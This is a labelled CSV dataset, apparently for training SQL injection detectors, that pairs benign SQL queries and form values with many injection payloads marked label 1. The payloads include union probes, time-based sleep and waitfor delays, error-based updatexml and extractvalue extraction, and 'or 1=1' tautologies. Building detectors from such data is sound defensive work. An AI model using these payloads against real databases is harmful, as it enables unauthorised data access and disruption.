Query,Label
"-9923%'   )    )     )   union all select 8985,8985,8985,8985,8985,8985,8985#",1
"iif  (  6369  =  5881,1,1/0  )  ",1
ingelber,0
SELECT * FROM alone WHERE    NOT single = 'officer',0
"select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 and    (    (   'zdkn'  =  'zdkn",1
"1'||  (  select 'hvqw' from dual where 4423  =  4423 union all select null,null,null--",1
SELECT camera ( s )  FROM test,0
-4339  )   where 7178  =  7178 or 4008  =  7232,1
palacn aucapia,0
"c/ antonia lancha, 38, 1?h",0
SELECT dollar ( s )  FROM stiff SELECT root FROM contrast,0
"1   )    )    as hgtl where 3864  =  3864 and elt  (  3114  =  3114,sleep  (  5   )    )   #",1
48c09a,0
"plaza del yunque, 4,",0
"  SELECT fix AS past, morning AS [recognize]  FROM tape",0
"1   )    )     )   or row  (  1045,7562  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  1045  =  1045,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 8488 union select 5584 union select 3051 union select 1210  )  a group by x  )   and    (    (     (  1782  =  1782",1
SELECT * FROM birthday WHERE all = 'party' LIMIT 3,0
SELECT * FROM desert WHERE flew = 'pleasure'  AND  ( according = 'won' OR flow = 'stretch' ) ,0
65472744r,0
724,0
SELECT TOP 3 * FROM particular WHERE except = 'ranch' SELECT * FROM double,0
waitfor delay '0:0:5'#,1
-4494 or 5291  =  4452,1
"INSERT INTO trip  ( slight, organized, duck )  VALUES  ( 'made', 'previous', 'gather' )  ",0
"1"" and 8189  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",1
"1%""   )    )     )   or 7427  =  dbms_pipe.receive_message  (  chr  (  116  )  ||chr  (  87  )  ||chr  (  90  )  ||chr  (  109  )  ,5  )  --",1
SELECT AVG ( fresh ) FROM anywhere,0
"1' where 1628  =  1628 and 6510  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --",1
"   SELECT back,sharp,anything,include,pick     (  (  hill JOIN please ON fresh.during =  transportation.fresh )   INNER JOIN sceneON Orders.upon =  wall.goneID ) ",0
1 or 1  =  1,1
select   (  case when   (  5163  =  4861  )   then 1 else 5163*  (  select 5163 from master..sysdatabases  )   end  )  --,1
"1%'   )    )    or 8315  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and    (    (   '%'  =  '",1
c632i6ela,0
"SELECT wp_posts.* FROM wp_posts LEFT JOIN wp_postmeta ON  (  wp_posts.ID  =  wp_postmeta.post_id AND wp_postmeta.meta_key  =  'fave_agent_visible'  )  LEFT JOIN wp_postmeta AS mt1 ON  (  wp_posts.ID  =  mt1.post_id  )  WHERE 1 = 1 AND wp_posts.ID NOT IN  ( 28313,28341 )  AND  (  wp_postmeta.post_id IS NULL OR  (  mt1.meta_key  =  'fave_agent_visible' AND CAST ( mt1.meta_value AS SIGNED )  ! =  '1'  )   )  AND wp_posts.post_type  =  'houzez_agent' AND   (  (  wp_posts.post_status  =  'publish'  )  )   GROUP BY wp_posts.ID ORDER BY wp_posts.post_title ASC",0
"   SELECT rod, create, seldomFROM happily WHERE idea  IS NOT NULL",0
SELECT TOP 3 * FROM chart WHERE moment = 'house' SELECT * FROM nearly,0
"-9718%""  )   union all select 9515,9515,9515#",1
1  )   where 6725  =  6725 and 1553  =  7419,1
ushiahua,0
"admin""  )   or   (  ""1""  =  ""1",1
carrera,0
SELECT * FROM nest WHERE    NOT burst = 'source',0
"1 or 8421  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   # jmki",1
22535,0
"c/ clarin, 117",0
lucila2,0
rgiva,0
if  (  8537  =  7034  )   select 8537 else drop function vqmp--,1
select   (  case when   (  8808  =  1367  )   then 1 else 8808*  (  select 8808 from master..sysdatabases  )   end  )  --,1
SELECT * FROM anybody WHERE dear = 'dirt' FETCH FIRST 3 ROWS ONLY,0
"1' in boolean mode  )   and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )  #",1
"1   )    )    and make_set  (  8403  =  8403,8899  )   and    (    (   4686  =  4686",1
SELECT * FROM picture,0
"select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 and   (  ""gzhp""  =  ""gzhp",1
presencio,0
SELECT TOP 3 * FROM fed SELECT * FROM line 3SELECT * FROM verb,0
SELECT TOP 3 * FROM tropical SELECT * FROM settlers 3SELECT * FROM hide,0
tipton9,0
SELECT parent ( s )  FROM gently LEFT JOIN,0
aristteles,0
1'  )   where 8575  =  8575 and 3715 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  3715  =  3715  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )  --,1
"1'   )    )     )   or 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #",1
"-8487'  )   where 9655  =  9655 union all select 9655,9655,9655,9655,9655,9655,9655,9655,9655,9655--",1
"-5225'   )    )    as zats where 5629  =  5629 union all select 5629,5629,5629,5629,5629--",1
"1'  )   as qaec where 6572  =  6572 or 5356  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --",1
"1'   )    )    as cgey where 2130  =  2130 and make_set  (  7914  =  4032,4032  )  --",1
ag-uzadura,0
SELECT * FROM Customers -- WHERE City = 'Berlin';,0
"-9583%""   )    )    union all select 9349,9349,9349,9349,9349,9349,9349--",1
SELECT * FROM joined WHERE essential NOT BETWEEN 'pole' AND 'support',0
cantabria,0
"1' where 3612  =  3612 and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )  --",1
SELECT AVG ( motor ) FROM explore,0
columbino,0
SELECT CURRENT_TIMESTAMP (  ) ;,0
"SELECT post_id, meta_key, meta_value FROM wp_postmeta WHERE post_id IN  ( 290914 )  ORDER BY meta_id ASC",0
1  )   where 4711  =  4711,1
SELECT TOP 3 * FROM movement,0
hernardo,0
"   SELECT Employees.canal, COUNT ( Orders.properID )  AS meetFROM    ( OrdersINNER JOIN height ON Orders.factorID  =  Employees.freeID ) ",0
SELECT COUNT ( bareID ) FROM riding,0
"call regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and   (  ""%""  =  """,1
largueado,0
"1'   )    )     )   and char  (  120  )  ||char  (  106  )  ||char  (  117  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  9981  )  ,0  )  ,5000000000  )  ,null  )   and    (    (     (  'skdy'  =  'skdy",1
end and   (  'unko'  =  'unko,1
SELECT * FROM spread ORDER BY say,0
"1%""   )    )    or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and    (    (   ""%""  =  """,1
-4681 or 4747  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4747  =  4747  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  # rltx,1
"select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 and   (  'fwok' like 'fwok",1
or 1 in   (  select @@version  )  --,1
SELECT * FROM halfway WHERE appropriate = 'noted' FETCH FIRST 3 ROWS ONLY,0
"1%""   )    )    and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and    (    (   ""%""  =  """,1
1'  )   as twny where 9580  =  9580,1
25214,0
SELECT * FROM honor 3,0
"1'  )   or elt  (  6272  =  6272,sleep  (  5   )    )    and   (  'tmbs'  =  'tmbs",1
"   SELECT even, bus+ ', ' + shoulder+ ' ' + flew+ ', ' + there AS oil  FROM flight",0
SELECT TOP 3 * FROM list WHERE build = 'pilot' SELECT * FROM native,0
"   SELECT check, whistle+ ', ' + useful+ ' ' + mission+ ', ' + swimming AS ordinary  FROM family",0
10262643c,0
32,0
"-6883""  )   as tbai where 8121  =  8121 union all select 8121,8121,8121,8121,8121,8121,8121,8121--",1
gnaeding,0
2111,0
goldsmith1@esmarbella.ht,0
2,0
2.96781E+15,0
3146,0
SELECT COUNT ( natural ) FROM something,0
li74re04,0
SELECT heard FROM single UNION ALL SELECT vapor FROM tail ORDER BY solution,0
sorts bransuel,0
4.86024E+14,0
"-1510""  )   as rqrv where 4507  =  4507 union all select 4507,4507,4507,4507,4507--",1
select * from users where id  =  1 or \.<1 or 1  =  1 -- 1,1
" SELECT column_name ( s )  FROM parallel,kind",0
"1""  )   union all select null,null,null,null--",1
1'+  (  select nxfp where 5006  =  5006,1
lula,0
"1' in boolean mode  )   union all select null,null--",1
"  SELECT color AS enjoy, broke AS [both]  FROM television",0
SELECT TOP 3 * FROM pet WHERE talk = 'face',0
"1""  )   where 8407  =  8407 and 9254  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",1
SELECT * FROM gone WHERE around = 'bear' LIMIT 3,0
" select * from users where id  =  1 or ""1#"" or 1  =  1 -- 1",1
6.79504E+13,0
"1"" where 1140  =  1140 or 2367  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",1
SELECT business FROM word UNION ALL SELECT desk FROM exactly ORDER BY fear,0
DELETE FROM catch WHERE could = 'win',0
SELECT * FROM bicycle WHERE slabs = 'position'  OR breathe = 'settlers',0
FROM  ( SELECT DISTINCT gold FROM my ) ,0
1'||  (  select 'brsr' where 5458  =  5458,1
SELECT coffee ( s )  FROM neighborhood UNION ALL,0
"select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 and   (  ""yobb"" like ""yobb",1
"1  )   or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    and   (  1185  =  1185",1
olea de boedo,0
SELECT * FROM gold WHERE interest = 'television'  OR sang = 'average',0
"1' and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  ",1
" SELECT * FROM vapor ORDER BY adjective, consider",0
"  SELECT * FROM cannot WHERE soft IN  ( 'toward', 'harbor', 'cloth' )  ",0
"1'  )   or 8421  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )    and   (  'obmu'  =  'obmu",1
19141,0
-2429%' or 6890  =  5846,1
8232,0
FROM  ( SELECT DISTINCT massage FROM fact ) ,0
"1%' and 5556  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )   and '%'  =  '",1
SELECT * FROM Products,0
"-2959"" union all select 3414,3414,3414,3414,3414,3414,3414,3414#",1
SELECT COUNT ( memory ) FROM organization,0
"1'  )   where 1225  =  1225 and elt  (  8831  =  7779,7779  )  --",1
SELECT * FROM carbon WHERE indicate = 'paragraph' FETCH FIRST 3 ROWS ONLY,0
ergo226825e,0
SELECT * FROM simplest WHERE amount BETWEEN 'notice' AND 'five',0
callejon san felices 187,0
4.43193E+15,0
SELECT COUNT ( design )  FROM begun,0
" select * from users where id  =  1 or "",#"" or 1  =  1 -- 1",1
SELECT * FROM direction WHERE careful NOT BETWEEN 'somebody' AND 'definition',0
"1  )   where 2473  =  2473 and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )  --",1
SELECT COUNT ( simplestID ) FROM here,0
"1   )    )    procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )   and    (    (   3102  =  3102",1
"  UPDATE through SET count =  'piano', City =  'plane' WHERE chief =  simple",0
SELECT MIN ( ran )  AS beneath FROM wing,0
SELECT * FROM bag,0
decuir,0
"1""   )    )     )   or char  (  117  )  ||char  (  111  )  ||char  (  105  )  ||char  (  100  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and    (    (     (  ""lmjg"" like ""lmjg",1
?s,1
SELECT * FROM fireplace WHERE brick IN  ( SELECT green FROM type ) ,0
"-6194"" or 4747  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4747  =  4747  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  ",1
henry@sms24h.tr,0
SELECT * FROM garden,0
SELECT CURTIME (  )  + 1;,0
SELECT hot ( s )  FROM distant SELECT rose FROM area,0
c/ gomera 148 3?e,0
SELECT * FROM wind WHERE NOT basis = 'soon'  AND NOT land = 'front',0
"-4176'+  (  select 'muio' where 4256  =  4256 union all select 4256,4256,4256,4256,4256,4256#",1
"1""   )    )    as turj where 1237  =  1237",1
"INSERT INTO standard  ( pond, real, tune )  VALUES  ( 'choice', 'sudden', 'tax' )  ",0
catchot bacard,0
SELECT cup FROM last UNION SELECT stay FROM soap ORDER BY outside,0
03621656f,0
SELECT * FROM ran WHERE element NOT LIKE '[spell]%',0
"  SELECT pilotID AS ID, duty AS middle FROM concerned",0
"-3719"" union all select 6609,6609,6609,6609#",1
"1'  )   or char  (  119  )  ||char  (  100  )  ||char  (  99  )  ||char  (  121  )    =  regexp_substring  (  repeat  (  right  (  char  (  1441  )  ,0  )  ,5000000000  )  ,null  )  --",1
SELECT DISTINCT roof FROM trail,0
-8860  )   or 4144  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4144  =  4144  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  ) ,1
"-5780 or make_set  (  3464  =  4518,4518  )  -- icit",1
joyan,0
SELECT * FROM torn  WHERE zoo NOT LIKE '[dead]%',0
"  UPDATE syllable SET regular =  'went', City =  'provide' WHERE deeply =  swung",0
SELECT * FROM fed WHERE speech NOT LIKE 'forgot%',0
yecla,0
1   )    )    as sipp where 1999  =  1999 and   (  select * from   (  select  (  sleep  (  5   )    )     )  fzno  )  --,1
kri!sti,0
"c/ afluente, 82",0
"-6733'  )   where 4024  =  4024 union all select 4024,4024,4024,4024#",1
"   SELECT adult, just, slowFROM agree WHERE go  IS NOT NULL",0
"1',  (  select   (  case when   (  1609  =  1609  )   then waitfor delay '0:0:5' else 1609*  (  select 1609 from master..sysdatabases  )   end   )    )   ",1
SELECT TOP 3 * FROM somehow SELECT * FROM weather 3SELECT * FROM impossible,0
oskar,0
"-8425""   )    )    or   (  6485  =  1127  )  *1127 and    (    (   ""qruf""  =  ""qruf",1
SELECT * FROM all WHERE solution = 'press' LIMIT 3,0
"1'+  (  select dyfw where 7743  =  7743 and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )     )  +'",1
SELECT * FROM  ( SELECT meal FROM sat ) ,0
"1  )   as amgf where 4308  =  4308 and char  (  120  )  ||char  (  106  )  ||char  (  117  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  9981  )  ,0  )  ,5000000000  )  ,null  )  --",1
SELECT TOP 50 PERCENT * FROM running SELECT * FROM flower FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM recognize,0
"1""  )   and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and   (  ""nkgd""  =  ""nkgd",1
select case when 8867  =  7630 then 1 else null end--,1
1%'   )    )     )   and   (  9404  =  8390  )  *8390 and    (    (     (  '%'  =  ',1
SELECT * FROM park WHERE tried  BETWEEN 10 AND 20,0
"  SELECT partly,field FROM slide WHERE why = 'country' UNION SELECT no, replace FROM youth",0
"  SELECT safetyID AS ID, row AS me FROM action",0
2502,0
SELECT COUNT ( happen )  FROM fair,0
 or username like char  (  37  )  ;,1
"call regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  ",1
SELECT * FROM wp_posts WHERE ID  =  262335 LIMIT 1,0
1   )    )     ) ,1
SELECT * FROM vowel WHERE engine LIKE '%powerful%',0
"1'   )    )     )   union all select null,null,null#",1
"1   )    )    as ambt where 5198  =  5198 and char  (  120  )  ||char  (  106  )  ||char  (  117  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  9981  )  ,0  )  ,5000000000  )  ,null  )  --",1
"calle barrio carmelo 21,",0
"1"" where 9901  =  9901 and   (  2455  =  8499  )  *8499--",1
"-2718"" or 2724 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  2724  =  2724  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and ""xwbf""  =  ""xwbf",1
SELECT * FROM job FETCH FIRST 3 ROWS ONLY,0
mayolas,0
" SELECT column_name ( s )  FROM old,triangle",0
isidoro,0
"1'   )    )    as umah where 3781  =  3781 union all select null,null,null,null#",1
SELECT COUNT ( publicID ) FROM youth,0
ornellas3@professionalhost.com.pro,0
vlez acejas,0
"  UPDATE hurried SET definition =  'lungs', City =  'statement' WHERE tea =  problem",0
"   SELECT magic, replace, shoulder FROM hurt WHERE fierce  IS NULL",0
"-9508  )   union all select 9950,9950,9950,9950,9950,9950,9950#",1
SELECT option_value FROM wp_options WHERE option_name  =  '_transient_timeout_houzez_verification_success' LIMIT 1,0
16601924h,0
DELETE FROM explain WHERE development = 'is',0
"  SELECT weighID AS ID, repeat AS thought FROM office",0
select   (  case when   (  3168  =  5577  )   then 3168 else 3168*  (  select 3168 from mysql.db  )   end  )  #,1
"SELECT post_id, meta_key, meta_value FROM wp_postmeta WHERE post_id IN  ( 430 )  ORDER BY meta_id ASC",0
"  (  select * from   (  select  (  sleep  (  5   )    )     )  srmq  )   and   (  ""%""  =  """,1
"-4318""  )   as vpvt where 5543  =  5543 union all select 5543,5543,5543,5543,5543,5543--",1
"1   )    )    union all select null,null,null,null,null,null,null,null,null,null--",1
FROM  ( SELECT DISTINCT prepare FROM pond ) ,0
SELECT * FROM grew WHERE then NOT LIKE '[machine]%',0
SELECT * FROM vast ORDER BY forest DESC,0
1  )   as imdt where 6431  =  6431,1
SELECT MIN ( teacher )  AS song FROM castle,0
SELECT melted FROM strange,0
SELECT * FROM sick,0
31013,0
"1   )    )    union all select null,null,null#",1
"1'  )   procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )   and   (  'lkun' like 'lkun",1
